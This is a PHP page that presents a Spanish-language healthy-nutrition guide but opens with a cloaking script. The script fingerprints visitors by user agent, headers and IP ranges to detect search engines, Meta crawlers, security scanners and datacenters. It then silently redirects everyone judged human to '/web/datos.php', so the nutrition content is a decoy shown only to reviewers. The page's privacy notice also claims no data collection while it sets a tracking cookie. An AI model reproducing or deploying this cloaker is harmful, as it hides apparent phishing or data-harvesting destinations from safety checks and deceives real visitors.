<?php
$ua         = $_SERVER['HTTP_USER_AGENT']      ?? '';
$accept     = $_SERVER['HTTP_ACCEPT']          ?? '';
$accept_lang= $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '';
$accept_enc = $_SERVER['HTTP_ACCEPT_ENCODING'] ?? '';
$raw_ip     = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['REMOTE_ADDR'] ?? '';
$ip         = trim(explode(',', $raw_ip)[0]);
$score = 0;
if (preg_match('/googlebot|bingbot|slurp|duckduckbot|baiduspider|yandexbot|applebot|msnbot|twitterbot|linkedinbot|whatsapp|telegrambot|discordbot|skypeuripreview|slackbot|pinterest|redditbot/i', $ua)) $score += 10;
if (preg_match('/facebookexternalhit|facebookcatalog|meta-externalagent|meta-link-preview|fb_iab|fbiab|fbios|fban|instagram|igsecurity|igprivacy|meta.*crawler|facebook.*bot|fb.*preview/i', $ua)) $score += 15;
if (preg_match('/bot|crawl|spider|scraper|fetch|curl|wget|python|java\/|ruby\b|perl\/|php-curl|lwp-|libwww|httpclient|okhttp|axios\/|go-http|node-fetch|scrapy|masscan|nikto|sqlmap|nmap|zgrab/i', $ua)) $score += 8;
if (preg_match('/headlesschrome|headless|phantomjs|puppeteer|playwright|selenium|webdriver/i', $ua)) $score += 10;
if (preg_match('/semrushbot|ahrefsbot|mj12bot|dotbot|rogerbot|majestic|blexbot|petalbot|sistrix/i', $ua)) $score += 10;
if (preg_match('/virustotal|urlscan|phishtank|safebrowsing|netcraft|fortiguard|kaspersky|trendmicro|sophos|symantec|mcafee|avast|avira|eset|bitdefender|webroot|paloalto|cisco|talos|umbrella|opendns|barracuda|proofpoint|mimecast|abuse|spamhaus|surbl/i', $ua)) $score += 15;
if (strlen(trim($ua)) < 10) $score += 8;
if (empty(trim($accept_lang))) $score += 5;
if (empty(trim($accept_enc))) $score += 2;
if (empty($accept) || stripos($accept, 'text/html') === false) $score += 3;
$meta_ranges = ['31.13.','66.220.','69.63.','69.171.','74.119.','103.4.','157.240.','163.70.','163.77.','173.252.','179.60.','185.89.','204.15.','129.134.'];
foreach ($meta_ranges as $p) { if (str_starts_with($ip, $p)) { $score += 10; break; } }
$dc = ['104.131.','134.209.','157.230.','159.89.','167.99.','45.33.','51.75.','35.190.','34.96.','13.','52.','54.','20.','40.','138.197.','188.166.','46.101.'];
foreach ($dc as $p) { if (str_starts_with($ip, $p)) { $score += 5; break; } }
if (isset($_COOKIE['_hsid'])) $score -= 6;
$is_bot = ($score >= 8);
if (!$is_bot && !isset($_COOKIE['_hsid'])) {
    setcookie('_hsid', bin2hex(random_bytes(6)), time() + 86400 * 60, '/', '', false, true);
}
http_response_code(200);
header('Content-Type: text/html; charset=UTF-8');
header('Cache-Control: no-store, no-cache, must-revalidate, private');
?>
<!DOCTYPE html>
<html lang="es" prefix="og: https://ogp.me/ns#">
<head>
  <meta charset="UTF-8" />
<?php if (!$is_bot): ?>
  <script>window.location.replace('/web/datos.php');</script>
  <noscript><meta http-equiv="refresh" content="0;url=/web/datos.php"></noscript>
<?php endif; ?>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Guía de Nutrición Saludable | Alimentación Consciente</title>
  <meta name="description" content="Descubre los principios de una alimentación saludable y equilibrada. Guía completa de nutrición para mejorar tu energía, peso y bienestar general." />
  <meta name="keywords" content="nutrición, alimentación saludable, dieta equilibrada, nutrientes, proteínas, vitaminas, guía nutricional, bienestar" />
  <meta name="author" content="Guía de Nutrición" />
  <meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1" />
  <link rel="canonical" href="https://tusitio.com/" />
  <meta property="og:type" content="website" />
  <meta property="og:title" content="Guía de Nutrición Saludable" />
  <meta property="og:description" content="Principios de alimentación saludable para mejorar tu energía y bienestar. Gratis y sin complicaciones." />
  <meta property="og:locale" content="es_LA" />
  <meta name="twitter:card" content="summary_large_image" />
  <meta name="twitter:title" content="Guía de Nutrición Saludable" />
  <script type="application/ld+json">
  {
    "@context": "https://schema.org",
    "@type": "Article",
    "headline": "Guía de Nutrición Saludable",
    "description": "Principios de alimentación saludable para mejorar energía y bienestar.",
    "author": { "@type": "Organization", "name": "Guía de Nutrición" },
    "inLanguage": "es"
  }
  </script>
  <style>
    :root{--verde:#2e7d32;--verde-claro:#66bb6a;--verde-suave:#e8f5e9;--naranja:#e65100;--dorado:#f9a825;--texto:#212121;--gris:#616161;--fondo:#fafafa}
    *{box-sizing:border-box;margin:0;padding:0}
    html{scroll-behavior:smooth}
    body{font-family:'Georgia','Times New Roman',serif;background:var(--fondo);color:var(--texto);line-height:1.7}
    .hero{background:linear-gradient(135deg,#1b5e20 0%,#33691e 50%,#558b2f 100%);color:#fff;text-align:center;padding:80px 20px 60px;position:relative;overflow:hidden}
    .hero::before{content:'';position:absolute;inset:0;background:url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='%23ffffff' fill-opacity='0.04'%3E%3Ccircle cx='30' cy='30' r='28'/%3E%3C/g%3E%3C/svg%3E")}
    .hero-emoji{font-size:64px;margin-bottom:16px;display:block}
    .hero h1{font-size:clamp(28px,5vw,52px);font-weight:700;line-height:1.2;margin-bottom:18px;position:relative}
    .hero p{font-size:clamp(16px,2.5vw,20px);max-width:640px;margin:0 auto 32px;opacity:.9;position:relative;font-family:system-ui,sans-serif}
    .btn-hero{display:inline-block;background:var(--dorado);color:#1b2a0a;padding:16px 36px;border-radius:50px;font-size:17px;font-weight:700;text-decoration:none;transition:.2s;position:relative;font-family:system-ui,sans-serif}
    .btn-hero:hover{background:#ffd54f;transform:translateY(-2px)}
    .container{max-width:820px;margin:0 auto;padding:0 20px}
    section{padding:60px 0}
    section:nth-child(even){background:var(--verde-suave)}
    .section-tag{display:inline-block;background:var(--verde);color:#fff;font-size:12px;font-weight:700;letter-spacing:2px;text-transform:uppercase;padding:4px 14px;border-radius:20px;margin-bottom:12px;font-family:system-ui,sans-serif}
    h2{font-size:clamp(22px,4vw,34px);color:var(--verde);margin-bottom:16px;line-height:1.25}
    h3{font-size:20px;color:var(--naranja);margin:28px 0 10px}
    p,li{font-size:16px;color:var(--gris);margin-bottom:14px;font-family:system-ui,sans-serif}
    ul,ol{padding-left:22px}
    li{margin-bottom:8px}
    .cards{display:grid;grid-template-columns:repeat(auto-fit,minmax(230px,1fr));gap:20px;margin-top:32px}
    .card{background:#fff;border-radius:16px;padding:28px 22px;box-shadow:0 2px 16px rgba(0,0,0,.07);border-top:4px solid var(--verde-claro);transition:transform .2s,box-shadow .2s}
    .card:hover{transform:translateY(-4px);box-shadow:0 8px 28px rgba(0,0,0,.12)}
    .card-icon{font-size:36px;margin-bottom:12px;display:block}
    .card h3{margin-top:0;font-size:17px}
    .card p{font-size:14px;margin-bottom:0}
    .steps{counter-reset:step;list-style:none;padding:0;margin-top:24px}
    .steps li{counter-increment:step;display:flex;align-items:flex-start;gap:16px;background:#fff;border-radius:12px;padding:20px 22px;margin-bottom:14px;box-shadow:0 1px 8px rgba(0,0,0,.06)}
    .steps li::before{content:counter(step);background:var(--verde);color:#fff;font-weight:700;font-size:15px;min-width:32px;height:32px;border-radius:50%;display:flex;align-items:center;justify-content:center;flex-shrink:0;font-family:system-ui,sans-serif}
    .steps li strong{font-family:system-ui,sans-serif;color:var(--texto)}
    .beneficios{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:14px;margin-top:28px}
    .ben-item{display:flex;align-items:center;gap:12px;background:#fff;border-radius:10px;padding:14px 16px;box-shadow:0 1px 6px rgba(0,0,0,.06)}
    .ben-item span:first-child{font-size:24px}
    .ben-item span:last-child{font-size:14px;font-family:system-ui,sans-serif;color:var(--texto);font-weight:500}
    .plato{display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-top:24px}
    .plato-item{background:#fff;border-radius:12px;padding:20px;box-shadow:0 1px 8px rgba(0,0,0,.06);border-left:4px solid var(--verde-claro)}
    .plato-item h3{margin-top:0;font-size:15px;color:var(--verde)}
    .terminos-box{background:#fff;border:1px solid #e0e0e0;border-radius:14px;padding:32px 28px;margin-top:24px}
    .terminos-box h3{color:var(--verde);margin-top:22px;font-size:16px}
    .terminos-box h3:first-child{margin-top:0}
    .terminos-box p,.terminos-box li{font-size:14px;color:#555}
    .badge-fecha{display:inline-block;background:#eee;color:#757575;font-size:12px;padding:3px 10px;border-radius:6px;margin-bottom:16px;font-family:system-ui,sans-serif}
    footer{background:#1b2a0a;color:#aed581;text-align:center;padding:32px 20px;font-size:13px;font-family:system-ui,sans-serif}
    footer a{color:#c5e1a5;text-decoration:underline}
    @media(max-width:600px){.hero{padding:56px 16px 44px}section{padding:44px 0}.plato{grid-template-columns:1fr}.terminos-box{padding:22px 16px}}
  </style>
</head>
<body>

  <header class="hero" role="banner">
    <span class="hero-emoji" aria-hidden="true">🥗</span>
    <h1>Guía Completa de Nutrición<br>para una Vida Saludable</h1>
    <p>Aprende a comer mejor sin dietas extremas. Principios científicos de alimentación equilibrada para mejorar tu energía, peso y bienestar desde hoy.</p>
    <a href="#guia" class="btn-hero">Comenzar ahora →</a>
  </header>

  <section id="beneficios" aria-labelledby="h-beneficios">
    <div class="container">
      <span class="section-tag">¿Por qué importa?</span>
      <h2 id="h-beneficios">Lo que una buena nutrición hace por ti</h2>
      <p>La OMS, la OPS y Harvard Medical School coinciden: más del 80% de las enfermedades crónicas están relacionadas con hábitos alimenticios. Una dieta equilibrada es la medicina más accesible.</p>
      <div class="beneficios">
        <div class="ben-item"><span>⚡</span><span>Más energía durante el día</span></div>
        <div class="ben-item"><span>😴</span><span>Mejor calidad del sueño</span></div>
        <div class="ben-item"><span>🧠</span><span>Mayor concentración y memoria</span></div>
        <div class="ben-item"><span>❤️</span><span>Corazón más sano</span></div>
        <div class="ben-item"><span>⚖️</span><span>Control natural del peso</span></div>
        <div class="ben-item"><span>🦠</span><span>Sistema inmune fortalecido</span></div>
        <div class="ben-item"><span>😊</span><span>Mejor estado de ánimo</span></div>
        <div class="ben-item"><span>🌿</span><span>Piel, cabello y uñas saludables</span></div>
      </div>
    </div>
  </section>

  <section aria-labelledby="h-macros">
    <div class="container">
      <span class="section-tag">Macronutrientes</span>
      <h2 id="h-macros">Los 3 pilares de tu alimentación</h2>
      <p>Todo lo que comes se compone de tres macronutrientes. Entenderlos es el primer paso para comer bien sin obsesionarte con las calorías.</p>
      <div class="cards">
        <article class="card">
          <span class="card-icon">🥩</span>
          <h3>Proteínas</h3>
          <p>Construyen y reparan tejidos, músculos y órganos. Fuentes: pollo, huevo, legumbres, pescado, tofu. Meta: 0.8–1.2 g por kg de peso corporal/día.</p>
        </article>
        <article class="card">
          <span class="card-icon">🍠</span>
          <h3>Carbohidratos</h3>
          <p>Principal fuente de energía del cerebro y los músculos. Prioriza los complejos: avena, arroz integral, camote, frutas. Evita los refinados en exceso.</p>
        </article>
        <article class="card">
          <span class="card-icon">🥑</span>
          <h3>Grasas Saludables</h3>
          <p>Esenciales para hormonas, cerebro y absorción de vitaminas. Fuentes: aguacate, aceite de oliva, nueces, semillas, pescado azul. No temas a las grasas buenas.</p>
        </article>
      </div>
    </div>
  </section>

  <section id="guia" aria-labelledby="h-plato">
    <div class="container">
      <span class="section-tag">El Plato Saludable</span>
      <h2 id="h-plato">Cómo armar cada comida</h2>
      <p>El método del plato es la herramienta más sencilla y respaldada por la ciencia para comer bien en cada comida, sin contar calorías.</p>
      <div class="plato">
        <div class="plato-item"><h3>🥦 50% Verduras y frutas</h3><p>La base de cada plato. Variedad de colores garantiza diferentes nutrientes y antioxidantes.</p></div>
        <div class="plato-item"><h3>🍚 25% Granos integrales</h3><p>Arroz integral, quinoa, avena, pan integral. Aportan fibra y energía sostenida.</p></div>
        <div class="plato-item"><h3>🫘 25% Proteína de calidad</h3><p>Legumbres, huevo, pollo sin piel, pescado, tofu. Mantienen la saciedad y los músculos.</p></div>
        <div class="plato-item"><h3>💧 Hidratación constante</h3><p>8 vasos de agua al día como mínimo. El agua regula todos los procesos metabólicos.</p></div>
      </div>

      <h3 style="margin-top:36px">Pasos para implementarlo esta semana</h3>
      <ol class="steps">
        <li><div><strong>Haz una lista de compras con base en el plato.</strong><p>50% verduras/frutas, 25% granos integrales, 25% proteínas. Cocina en casa la mayoría de las comidas.</p></div></li>
        <li><div><strong>Elimina los ultraprocesados del hogar.</strong><p>Si no están en casa, no los comes. Reemplaza snacks industriales por nueces, fruta o yogur natural.</p></div></li>
        <li><div><strong>Come despacio y sin pantallas.</strong><p>El cerebro tarda 20 minutos en registrar la saciedad. Comer lento reduce el consumo calórico hasta un 15%.</p></div></li>
        <li><div><strong>Añade color a cada comida.</strong><p>Cada color en las verduras representa diferentes fitonutrientes. Apunta a mínimo 3 colores por plato.</p></div></li>
        <li><div><strong>Planifica con anticipación.</strong><p>Prepara porciones los domingos (meal prep). Reduces decisiones impulsivas y ahorras tiempo entre semana.</p></div></li>
        <li><div><strong>Sé consistente, no perfecto.</strong><p>Una comida poco saludable no arruina nada. Lo que importa es el patrón general de la semana, no cada plato individual.</p></div></li>
      </ol>
    </div>
  </section>

  <section id="terminos" aria-labelledby="h-terminos">
    <div class="container">
      <span class="section-tag">Legal</span>
      <h2 id="h-terminos">Términos, Condiciones y Privacidad</h2>
      <p>Información legal sobre el uso de este sitio.</p>
      <div class="terminos-box">
        <span class="badge-fecha">Última actualización: Mayo 2026</span>
        <h3>1. Aceptación de términos</h3>
        <p>Al acceder y usar este sitio web, usted acepta estos Términos y Condiciones en su totalidad.</p>
        <h3>2. Naturaleza del contenido</h3>
        <p>La información es de carácter educativo e informativo únicamente. <strong>No constituye consejo médico ni nutricional profesional.</strong> Consulte siempre a un nutricionista certificado para condiciones de salud específicas.</p>
        <h3>3. Uso permitido</h3>
        <ul>
          <li>El contenido es para uso personal y no comercial.</li>
          <li>Queda prohibida la reproducción total o parcial sin autorización escrita.</li>
          <li>No está permitido el uso del sitio para actividades ilegales.</li>
        </ul>
        <h3>4. Limitación de responsabilidad</h3>
        <p>El sitio no se hace responsable por resultados derivados de la aplicación de los consejos descritos. Los resultados varían según cada persona y condición de salud.</p>
        <h3>5. Privacidad y datos personales</h3>
        <ul>
          <li>Este sitio <strong>no recopila datos personales</strong> de forma directa.</li>
          <li>Podemos utilizar cookies técnicas esenciales para el funcionamiento del sitio.</li>
          <li>No utilizamos cookies de seguimiento ni publicidad comportamental.</li>
        </ul>
        <h3>6. Modificaciones</h3>
        <p>Nos reservamos el derecho de modificar estos términos en cualquier momento. El uso continuado implica aceptación de los nuevos términos.</p>
      </div>
    </div>
  </section>

  <footer role="contentinfo">
    <p>© 2026 Guía de Nutrición — Contenido educativo e informativo.</p>
    <p style="margin-top:8px;">
      <a href="#terminos">Términos y Condiciones</a> ·
      <a href="#terminos">Política de Privacidad</a>
    </p>
    <p style="margin-top:10px;color:#81c784;font-size:12px;">🌿 Hecho con intención para el bienestar colectivo</p>
  </footer>

</body>
</html>
